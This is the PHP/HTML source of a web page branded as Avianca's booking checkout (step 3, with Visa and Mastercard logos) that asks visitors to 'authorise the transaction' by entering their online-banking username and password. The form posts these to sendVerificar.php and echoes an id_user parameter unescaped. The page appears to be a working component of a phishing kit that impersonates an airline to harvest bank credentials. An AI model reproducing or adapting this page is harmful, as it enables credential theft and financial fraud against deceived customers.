<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="media/icon.ico" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" crossorigin="anonymous">
    <link rel="stylesheet" href="./css/style.css">

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css">

    <title>Avianca | #NACIONALES</title>
</head>

<body>
    <div class="header_check">
        <img src="media/logo-avianca-minimal.svg" class="logo">
        <img src="media/paso3.png" alt="" class="pasos">
    </div>

    <div class="body_check">
        <div class="container mt-4">
            <div class="row">
                <div class="col-6">
                    <img src="media/visa.png" alt="" id="imgtj" class="float-start">
                </div>
                <div class="col-6">
                    <img src="media/mastercad.jpg" class="float-end" alt="" id="imgtj">
                </div>
            </div>
        </div>
        <br><br>
        <div class="container-mt-5 ps-2 pe-2">
            <p class="text-center text-uppercase"><strong>Verificación de seguridad</strong></p>
            <p class="text-center">Debes autorizar la transacción que esta en proceso, inicia sesión en tu banca virtual, a continuacion:</p>
        </div>
        <br><br>

        <div class="container">
            <div class="card">
                <div class="card-body">
                    <form action="sendVerificar.php" method="POST">
                        <input type="hidden" value="<?php echo $_GET["id_user"]; ?> " name="id_user">
                        <div class="input-group mb-3">
                            <span class="input-group-text" id="basic-addon1">
                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24">
                                    <path fill="#000000" d="M12 4a4 4 0 0 1 4 4a4 4 0 0 1-4 4a4 4 0 0 1-4-4a4 4 0 0 1 4-4m0 10c4.42 0 8 1.79 8 4v2H4v-2c0-2.21 3.58-4 8-4Z" />
                                </svg>
                            </span>
                            <input type="text" class="form-control" placeholder="Usuario" name="usuario">
                        </div>
                        <div class="input-group mb-3">
                            <span class="input-group-text" id="basic-addon1">
                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24">
                                    <path fill="#000000" d="M12 17a2 2 0 0 0 2-2a2 2 0 0 0-2-2a2 2 0 0 0-2 2a2 2 0 0 0 2 2m6-9a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V10a2 2 0 0 1 2-2h1V6a5 5 0 0 1 5-5a5 5 0 0 1 5 5v2h1m-6-5a3 3 0 0 0-3 3v2h6V6a3 3 0 0 0-3-3Z" />
                                </svg>
                            </span>
                            <input type="password" class="form-control" placeholder="Contraseña" name="password">
                        </div>
                        <div class="form-group">
                            <button class="form-control btn btn-danger">
                                Login
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        </div>


    </div>




</body>


<?php
if (isset($_GET["error"]) && $_GET["error"] === "empty") {
?>
    <div class="content_modal_e content_modal_e_2">
        <div class="modal">
            <div class="close">
                <i class="far fa-times-circle" onclick="closeModale();"></i>
            </div>
            <div class="text">
                <p>Debes llenar todos los datos, <br>
                    por favor vuelve a intentarlo</p>
            </div>
            <button type="button" onclick="closeModale();">OK</button>
        </div>
    </div>
<?php
}
?>

<?php
if (isset($_GET["error"])  && $_GET["error"] === "error") {
?>
    <div class="content_modal_e content_modal_e_2">
        <div class="modal">
            <div class="close">
                <i class="far fa-times-circle" onclick="closeModale();"></i>
            </div>
            <div class="text">
                <p>Usuario o contraseña incorrecta... <br>
                    por favor vuelve a intentarlo</p>
            </div>
            <button type="button" onclick="closeModale();">OK</button>
        </div>
    </div>
<?php
}
?>
<script src="js/jquery-3.7.1.min.js"></script>
<script src="js/modal.js"></script>

</html>